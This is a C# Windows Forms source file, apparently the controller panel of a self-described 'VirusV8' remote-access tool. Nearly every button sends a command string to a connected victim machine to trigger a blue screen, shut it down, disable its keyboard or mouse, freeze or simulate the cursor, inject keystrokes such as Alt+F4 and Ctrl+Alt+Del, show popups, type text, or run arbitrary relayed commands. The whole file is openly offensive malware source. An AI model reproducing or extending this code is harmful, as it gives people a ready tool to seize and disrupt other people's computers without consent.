using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace VirusV8
{
    public partial class ClientVerwaltung : MetroFramework.Forms.MetroForm
    {
        Server s;

        public ClientVerwaltung(Server s)
        {
            InitializeComponent();
            this.s = s;
        }//

        private void button1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }
    

        private void button2_Click(object sender, EventArgs e)
        {
            byte[] bytes = Encoding.ASCII.GetBytes("exit");
            s.send(bytes);
        }

        private void Button_Exit_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void Button_VirusExit_Click(object sender, EventArgs e)
        {
            byte[] bytes = Encoding.ASCII.GetBytes("ExitVirus");
            s.send(bytes);
        }

        private void Button_VirusConnections_Click(object sender, EventArgs e)
        {

        }

        private void Button_VirusShutdown_Click(object sender, EventArgs e)
        {
            byte[] bytes = Encoding.ASCII.GetBytes("ShutDown");
            s.send(bytes);
        }

        private void Button_VirusUsers_Click(object sender, EventArgs e)
        {

        }

        private void Button_VirusConnectionReset_Click(object sender, EventArgs e)
        {

        }

        private void Button_VirusDisableInterrupts_Click(object sender, EventArgs e)
        {
            byte[] bytes = Encoding.ASCII.GetBytes("DisableInterrupts");
            s.send(bytes);
        }

        private void Button_BlueScreen_Click(object sender, EventArgs e)
        {
            byte[] bytes = Encoding.ASCII.GetBytes("BlueScreen");
            s.send(bytes);
        }

        private void Button_Maus_Freeze_Click(object sender, EventArgs e)
        {
            byte[] bytes = Encoding.ASCII.GetBytes("MouseFreezeMiddle");
            s.send(bytes);
        }

        private void Button_Maus_Klick_Click(object sender, EventArgs e)
        {
            byte[] bytes = Encoding.ASCII.GetBytes("MouseKlick");
            s.send(bytes);
        }

        private void Button_Maus_DoubleKlick_Click(object sender, EventArgs e)
        {
            byte[] bytes = Encoding.ASCII.GetBytes("MouseDoubleKlick");
            s.send(bytes);
        }

        private void Button_Maus_Disable_Click(object sender, EventArgs e)
        {
            byte[] bytes = Encoding.ASCII.GetBytes("MouseDisable");
            s.send(bytes);
        }

        private void Button_Maus_Simulate_Click(object sender, EventArgs e)
        {
            byte[] bytes = Encoding.ASCII.GetBytes("MouseSimulation:"+Cursor.Position.X+":"+Cursor.Position.Y+"");
            s.send(bytes);
        }

        private void Button_Keyboard_Deaktivate_Click(object sender, EventArgs e)
        {
            byte[] bytes = Encoding.ASCII.GetBytes("KeyboardDisable");
            s.send(bytes);
        }

        private void Button_Keyboard_AutoEnter_Click(object sender, EventArgs e)
        {
            if (Button_Keyboard_AutoEnter.Image == null)
            {
                Button_Keyboard_AutoEnter.Image = VirusV8.Properties.Resources._040_recycle_bin;
                byte[] bytes = Encoding.ASCII.GetBytes("AutoEnterEnable");
                s.send(bytes);
            }
            else
            {
                Button_Keyboard_AutoEnter.Image = null;
                byte[] bytes = Encoding.ASCII.GetBytes("AutoEnterDisable");
                s.send(bytes);
            }
        }

        private void Button_Keyboard_AutoSpace_Click(object sender, EventArgs e)
        {
            if (Button_Keyboard_AutoSpace.Image == null)
            {
                Button_Keyboard_AutoSpace.Image = VirusV8.Properties.Resources._040_recycle_bin;
                byte[] bytes = Encoding.ASCII.GetBytes("AutoSpaceEnable");
                s.send(bytes);
            }
            else
            {
                Button_Keyboard_AutoSpace.Image = null;
                byte[] bytes = Encoding.ASCII.GetBytes("AutoSpaceDisable");
                s.send(bytes);
            }
        }

        private void Button_Keyboard_AltF4_Click(object sender, EventArgs e)
        {
            byte[] bytes = Encoding.ASCII.GetBytes("KeyboardAltF4");
            s.send(bytes);
        }

        private void Button_Keyboard_Enter_Click(object sender, EventArgs e)
        {
            byte[] bytes = Encoding.ASCII.GetBytes("KeyboardEnter");
            s.send(bytes);
        }

        private void Button_Keyboard_Space_Click(object sender, EventArgs e)
        {
            byte[] bytes = Encoding.ASCII.GetBytes("KeyboardSpace");
            s.send(bytes);
        }

        private void Button_Keyboard_StrgAltEnt_Click(object sender, EventArgs e)
        {
            byte[] bytes = Encoding.ASCII.GetBytes("KeyboardStrgAltEntf");
            s.send(bytes);
        }

        private void Button_Keyboard_AltTab_Click(object sender, EventArgs e)
        {
            byte[] bytes = Encoding.ASCII.GetBytes("KeyboardAltTab");
            s.send(bytes);
        }

        private void ClientVerwaltung_FormClosed(object sender, FormClosedEventArgs e)
        {
            Application.Exit();
        }

        private void bunifuFlatButtonSend_Click(object sender, EventArgs e)
        {
            byte[] bytes = Encoding.ASCII.GetBytes(TextBox_Commands.Text);
            s.send(bytes);
            TextBox_Commands.Text = "";
        }

        private void TextBox_Commands_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == (char)Keys.Enter)
            {
                bunifuFlatButtonSend_Click(sender, e);
                e.Handled = true;
            }
        }

        private void bunifuCheckbox1_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox1.Checked == true)
            {
                timerSendMousePosition.Enabled = true;
            }
            else
            {
                timerSendMousePosition.Enabled = false;
            }
        }

        private void timerSendMousePosition_Tick(object sender, EventArgs e)
        {
            byte[] bytes = Encoding.ASCII.GetBytes("MouseSimulation:" + Convert.ToDouble(Cursor.Position.X)  / Convert.ToDouble(Screen.PrimaryScreen.Bounds.Width) + ":" + Convert.ToDouble(Cursor.Position.Y) / Convert.ToDouble(Screen.PrimaryScreen.Bounds.Height));
            s.send(bytes);
        }

        private void monoFlat_ButtonPopUpMessage_Click(object sender, EventArgs e)
        {
            MessageCheckTimer.Enabled = true;
            PopUpNachrichtEditor PopUpEdit = new PopUpNachrichtEditor();
            PopUpEdit.ShowDialog();
        }

        private void MessageCheckTimer_Tick(object sender, EventArgs e)
        {
            if (PopUpNachrichtEditor.Vars.Ready == true)
            {
                MessageCheckTimer.Enabled = false;
                //Send Text
                byte[] bytes = Encoding.ASCII.GetBytes("PopUpMessage:"+PopUpNachrichtEditor.Vars.PopUpText+":"+PopUpNachrichtEditor.Vars.Anzeigezeit.ToString());
                s.send(bytes);
            }
            else if (PopUpNachrichtEditor.Vars.Abbruch == true)
            {
                MessageCheckTimer.Enabled = false;
            }
        }

        private void Button_Keyboard_SendText_Click(object sender, EventArgs e)
        {
            byte[] bytes = Encoding.ASCII.GetBytes("SendText:" + richTextBoxSendText.Text);
            s.send(bytes);
        }
    }
}
